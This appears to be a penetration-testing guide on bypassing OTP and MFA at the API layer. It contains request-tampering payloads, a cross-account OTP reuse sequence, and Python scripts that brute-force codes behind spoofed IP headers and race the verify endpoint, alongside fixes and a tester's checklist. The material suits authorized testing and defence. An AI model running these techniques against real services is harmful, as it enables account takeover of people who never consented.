# API Auth & OTP/MFA Bypass (API2:2023 — Broken Authentication)

API-side techniques for defeating one-time-password / MFA / password-reset flows. Every payload
here targets the **verification endpoint** (`/api/verify-otp`, `/api/2fa/verify`, reset-token
confirm, transaction-signing), not the UI — the API layer is routinely weaker than the web UI it
sits behind. Test OTP in **every** flow, not just login: signup, password reset, email/phone change,
payment/transaction confirmation, 2FA enrollment, and account recovery (missing these misses ~70% of
OTP bugs). Prove impact across **two accounts** (attacker + victim) plus an unauth session.

> Curated from TrinetLayer Learn (learn.trinetlayer.com).

---

## 1. Request tampering on the verify endpoint

Weak validators fail open on unexpected shapes. For each, submit and watch for a success response /
session grant.

| Technique | Payload (JSON body) | Success signal |
| --- | --- | --- |
| **Drop the OTP param** | send `{"email":"user@x.com"}` with the `otp` field removed | login/reset succeeds — backend assumed the step passed |
| **Null / empty / whitespace** | `"otp":null` · `"otp":""` · `"otp":"   "` · `"otp":false` | validation short-circuits on the falsy/empty branch |
| **Type confusion** | `"otp":["123456"]` · `"otp":{"code":"123456"}` · `"otp":[null]` | array/object compares "equal" or bypasses a string check (weakly typed backends: PHP, Node) |
| **Trailing/leading noise** (also dodges rate-limit fingerprinting) | `"123456 "` · `" 123456"` · `"123456\n"` · `"123456\x00"` · `"123456%00"` | code accepted despite padding → server trims *after* the rate-limit key is computed |
| **Verb / method swap** | replay verify as `GET`/`PUT`/`HEAD`, or add `X-HTTP-Method-Override` | alternate handler skips the OTP check |
| **Content-type confusion** | resend as `application/x-www-form-urlencoded` (`otp=123456`) instead of JSON | different parser/code path with weaker validation |

**Skip the step entirely.** Navigate straight to the post-OTP endpoint (`/api/dashboard`,
`/api/checkout/complete`) or resume the session without ever calling verify. If the protected route
does not enforce `otpVerified` server-side, that is a full MFA bypass.

**Trust-the-client boolean.** If OTP is validated client-side and the browser then posts
`{"verified":true}` / `{"otpVerified":1}`, intercept and set the flag directly — the backend trusts
the frontend. Also flip the *response*: if the verify response is `{"status":"fail"}` and the client
gates on it, rewrite it to `{"status":"success"}` in the proxy and see if the flow proceeds.

---

## 2. OTP not bound to user / session (the highest-impact class)

The OTP is stored globally (by phone or email, or just "does this code exist") instead of bound to a
specific `user_id` + session. Proven with two accounts:

```
# 1) Request an OTP for an account YOU control
POST /api/request-otp        {"email":"attacker@x.com"}     -> 200, code 123456 (you receive it)

# 2) Verify it against the VICTIM's identity (OTP + IDOR)
POST /api/verify-otp         {"email":"victim@x.com","otp":"123456"}
# or: keep your valid OTP, swap the id/session the code is checked against
POST /api/verify-otp         {"user_id":12345,"otp":"123456"}   # 12345 = victim
```

If a code minted for A authenticates B → **account takeover at scale**. Root cause is server code that
checks `if (otpExists(code))` or keys on `otp:${phoneNumber}` instead of `otp:${userId}:${sessionId}`.
Variants: **usable across accounts** that share a phone/email; **valid across devices** (code from the
mobile app works in a desktop browser — no device fingerprint / IP correlation).

---

## 3. Reuse & no-invalidation

The code verifies correctly but is never burned. Test each lifecycle boundary:

- **Reuse after success** — complete a login/transaction, then replay the *same* code; it should be
  marked `used` on first accept. (Vulnerable: `if (code==stored && !expired)` with no `used` flag.)
- **Not invalidated on logout** — request a code, log out, code still verifies for an attacker.
- **Valid after password/email change** — reset password via OTP, then the *old* reset code still
  works (should invalidate all pending OTPs + sessions on credential change).
- **"Remember once"** — after one OTP the device is trusted indefinitely; steal the session cookie and
  it never re-challenges. Check trusted-device expiry.
- **Client-side trusted device** — trusted flag lives in `localStorage`/cookie
  (`trusted_device_id=abc123`); copy the victim's value onto the attacker device to skip OTP. Trust
  must be server-side, keyed to hardware/IP, not a client token.

---

## 4. Rate-limit bypass (re-enable brute force)

The verify endpoint caps guesses per IP, not per authenticated user. A 6-digit numeric OTP is only
10^6 (often far less with short TTL + no lockout), so any cap bypass makes it brute-forceable — the
same math defeats **backup / recovery codes** and reset PINs. Prove the *gap*; do not actually flood a
target you don't own.

```python
# IP-based limit, spoofed per request — rotate the header the limiter keys on
for guess in candidates:
    for h in ({"X-Forwarded-For": rand_ip()}, {"X-Real-IP": rand_ip()},
              {"X-Originating-IP": rand_ip()}, {"X-Client-IP": rand_ip()},
              {"X-Forwarded-For": "127.0.0.1"}):      # also try trusted/internal values
        requests.post(VERIFY, json={"otp": guess}, headers=h)
```

Other bypasses: **casing/format variants** of the code that reset the limiter fingerprint; **null-byte /
whitespace padding** (`123456%00`, `123456\n`) that the limiter counts as distinct while the validator
trims; **new session/token per burst**; hitting a **parallel API version** (`/api/v1` vs `/api/v2`) or
the **mobile endpoint**, which frequently lacks the web UI's limit. Correct fix: rate-limit by
authenticated `user_id`, not IP/header.

Also check **resend abuse**: if "resend" returns the *same* code each time, its lifetime is extended
indefinitely (and enables SMS bombing / DoS); a secure resend invalidates the prior code and mints a
fresh one.

---

## 5. Race conditions on verify (TOCTOU)

If "check code" and "mark used" aren't atomic, parallel requests slip through the window — reuse a
single code many times, or beat the lockout counter. Use Burp Turbo Intruder's single-packet attack or
async fan-out; fire *simultaneously*, not serially.

```python
import asyncio, aiohttp
async def hit(s, code):
    async with s.post(VERIFY, json={"otp": code}) as r: return (await r.json()).get("success")
async def race(code, n=100):
    async with aiohttp.ClientSession() as s:
        print(sum(bool(x) for x in await asyncio.gather(*(hit(s, code) for _ in range(n)))))
asyncio.run(race("123456"))
```

Root cause: no DB row lock / non-atomic update on the OTP record. Same primitive also bypasses
single-use limits on coupons, transfers, and lockout counters (see the race-condition skill).

---

## 6. Information leakage — OTP in the response

Debug left on, or verbose errors, hand you the code directly. Inspect **body and headers** of the
request-OTP response:

```
POST /api/request-otp
HTTP/1.1 200 OK
X-Debug-OTP: 123456                      <- header leak
X-OTP-Sent: true
{ "success": true, "debug": { "otp_code": "123456" } }   <- body leak
```

Also flag OTP delivered/verified over plaintext **HTTP** (MITM on shared WiFi reads it), and any
enumeration oracle where valid vs invalid identity yields different status/length/timing on
request-OTP.

---

## 7. Web vs API surface

The same backend bug is often patched on web but exposed on the API. Test **both** for every flow:

| Surface | Auth model | Where it's weak | Tooling |
| --- | --- | --- | --- |
| Web app | session cookie, CSRF token | frontend-only validation, cookie scope, session fixation | DevTools, Burp, cookie editor |
| Mobile / API | Bearer/JWT, direct HTTP | missing rate limits, verbose errors leaking OTP, weak token→user binding | Burp Mobile Assistant, mitmproxy, Postman, Charles |

Intercept the mobile app, then hit `/api/v1` **and** `/api/v2` directly — undocumented/older versions
routinely skip the limiter and binding checks the web UI enforces.

---

## 8. Test checklist (climb the Validation Ladder before reporting)

- OTP expires (5–10 min) and is single-use; rejected after expiry and after first success.
- Verification is **server-side**, bound to `user_id` **and** session — not global, not cross-account,
  not cross-device.
- Invalidated on logout, and on password/email change (plus all sessions killed).
- Rate limit is per-user and survives header spoofing / casing / padding / version swap.
- Resend mints a fresh code and invalidates the old one.
- Verify is atomic (no race reuse).
- No OTP in any response body/header/log; TLS enforced end-to-end.
- Step cannot be skipped by direct navigation; trusted-device state is server-side and expires.

**Not a bug** (no impact = no report): testing OTP only against your *own* account with your *own*
code; a rate limit you merely *hit* without a sensitive flow behind it; a debug leak on a non-prod
host. Report cross-account/cross-session reuse, MFA skip, code leakage, or a brute-forceable verify.

**Report as:** *API2:2023 Broken Authentication*; CWEs — CWE-287 (improper authentication), CWE-306
(missing auth on the skipped step), CWE-640 (weak password-recovery), CWE-307 (no brute-force
protection), CWE-384 (session fixation), CWE-200/CWE-215 (OTP leaked in response/debug), CWE-362
(race). Chain OTP-not-bound + IDOR as *full account takeover*.
